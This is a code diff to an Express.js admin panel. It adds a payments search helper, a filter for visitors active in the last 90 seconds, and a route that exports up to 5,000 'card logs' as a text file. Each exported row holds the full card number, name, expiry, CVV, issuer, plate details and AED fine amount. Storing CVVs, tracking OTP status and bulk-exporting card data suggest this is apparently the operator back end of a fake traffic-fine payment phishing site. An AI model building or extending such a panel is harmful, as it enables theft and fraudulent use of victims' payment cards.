@@ -68,31 +68,74 @@ router.get('/dashboard', requireAdmin, async (req, res) => {
   }
 });
 
+// ─── Payments helpers ─────────────────────────────────────────────────────────
+function buildPaymentsWhere(statusFilter, search, activeFilter) {
+  let where = '1=1', params = [];
+  if (statusFilter) { where += ' AND otp_status = ?'; params.push(statusFilter); }
+  if (search) {
+    where += ' AND (plate_no LIKE ? OR card_number LIKE ? OR card_name LIKE ? OR card_issuer LIKE ?)';
+    params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
+  }
+  if (activeFilter) {
+    where += " AND last_seen > NOW() - INTERVAL '90 seconds'";
+  }
+  return { where, params };
+}
+
 // ─── Payments ────────────────────────────────────────────────────────────────
 router.get('/payments', requireAdmin, async (req, res) => {
   const statusFilter = req.query.status || '';
   const search       = req.query.q || '';
+  const activeFilter = req.query.active === '1';
   const page         = Math.max(1, parseInt(req.query.p) || 1);
   const perPage      = 25;
   const offset       = (page - 1) * perPage;
 
   try {
-    let where = '1=1', params = [];
-    if (statusFilter) { where += ' AND otp_status = ?'; params.push(statusFilter); }
-    if (search) {
-      where += ' AND (plate_no LIKE ? OR card_number LIKE ? OR card_name LIKE ? OR card_issuer LIKE ?)';
-      params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
-    }
+    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
     const total    = await count(`SELECT COUNT(*) FROM payments WHERE ${where}`, params);
     const payments = await query(`SELECT * FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
     const totalPages = Math.max(1, Math.ceil(total / perPage));
 
     res.render('admin/payments', {
       adminUser: req.session.adminUser,
-      payments, total, totalPages, page, statusFilter, search,
+      payments, total, totalPages, page, statusFilter, search, activeFilter,
     });
   } catch (e) {
-    res.render('admin/payments', { adminUser: req.session.adminUser, dbError: e.message, payments:[], total:0, totalPages:1, page:1, statusFilter, search });
+    res.render('admin/payments', { adminUser: req.session.adminUser, dbError: e.message, payments:[], total:0, totalPages:1, page:1, statusFilter, search, activeFilter: false });
+  }
+});
+
+// ─── Export card logs as .txt ─────────────────────────────────────────────────
+router.get('/payments/export', requireAdmin, async (req, res) => {
+  const statusFilter = req.query.status || '';
+  const search       = req.query.q || '';
+  const activeFilter = req.query.active === '1';
+
+  try {
+    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
+    const rows = await query(
+      `SELECT card_number, card_name, expiry, cvv, card_issuer, card_type, created_at, plate_no, plate_src, plate_code, total_fine
+       FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT 5000`,
+      params
+    );
+
+    const header = ['Card Number', 'Cardholder Name', 'Expiry', 'CVV', 'Issuer', 'Type', 'Date', 'Plate', 'Amount AED'].join('\t');
+    const lines = rows.map(r => {
+      const dt = r.created_at ? new Date(r.created_at).toLocaleString('en-AE', { timeZone:'Asia/Dubai' }) : '';
+      const plate = [r.plate_src, r.plate_code, r.plate_no].filter(Boolean).join(' ');
+      return [
+        r.card_number || '', r.card_name || '', r.expiry || '', r.cvv || '',
+        r.card_issuer || '', r.card_type || '', dt, plate, r.total_fine || 0,
+      ].join('\t');
+    });
+
+    const now = new Date().toISOString().slice(0,10);
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    res.setHeader('Content-Disposition', `attachment; filename="payments-${now}.txt"`);
+    res.send([header, ...lines].join('\r\n'));
+  } catch (e) {
+    res.status(500).send('Export error: ' + e.message);
   }
 });
 
